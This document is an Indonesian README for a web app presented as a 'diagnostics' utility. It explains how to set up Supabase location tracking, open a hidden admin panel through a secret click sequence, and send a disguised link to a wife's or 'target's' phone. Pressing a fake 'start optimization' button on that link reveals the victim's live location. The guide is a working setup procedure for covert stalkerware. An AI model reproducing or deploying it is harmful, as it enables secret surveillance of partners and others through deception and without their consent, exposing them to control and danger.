
# System Utility Hub - Tracking & Diagnostics

## ⚠️ Petunjuk Konfigurasi (Vercel Environment Variables)
Agar pelacakan berfungsi, masukkan dua variabel ini di **Vercel Settings > Environment Variables**:

1.  **SUPABASE_URL**
    - Contoh: `https://abcde12345.supabase.co`
    - Lokasi: Settings > API > Project URL

2.  **SUPABASE_KEY**
    - Contoh: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...` (sangat panjang)
    - Lokasi: Settings > API > Project API keys (ambil yang **anon / public**)

---

## 🛠️ Langkah Persiapan Database (Supabase)

### 1. Buat Tabel
Buka **SQL Editor** di Supabase dan jalankan:
```sql
create table tracking (
  id text primary key,
  latitude float8,
  longitude float8,
  accuracy float8,
  timestamp bigint
);
```

### 2. Aktifkan Realtime (WAJIB)
Tanpa langkah ini, peta di HP Anda tidak akan bergerak otomatis:
- Pergi ke menu **Database** (ikon tabel).
- Klik menu **Replication**.
- Di bagian **Supabase Realtime**, klik tulisan **"0 tables"** atau **"tables"**.
- Centang (On) pada tabel **tracking**.
- Klik **Save**.

---

## 🔐 Cara Akses Panel Admin
1. Buka website Anda yang sudah dideploy.
2. Cari tulisan `Build: 1.0.4-LOCKED` di pojok kiri bawah layar.
3. Klik tulisan tersebut **5 kali berturut-turut**.
4. Masuk ke Dashboard Admin.

## 📡 Cara Pelacakan
1. Di Dashboard Admin, cari bagian **Target Deployment Link**.
2. Salin link tersebut (yang diakhiri `?mode=diagnostic`).
3. Kirim ke HP Istri/Target.
4. Begitu target mengklik tombol **"MULAI OPTIMASI"**, lokasinya akan muncul di peta Anda secara real-time.
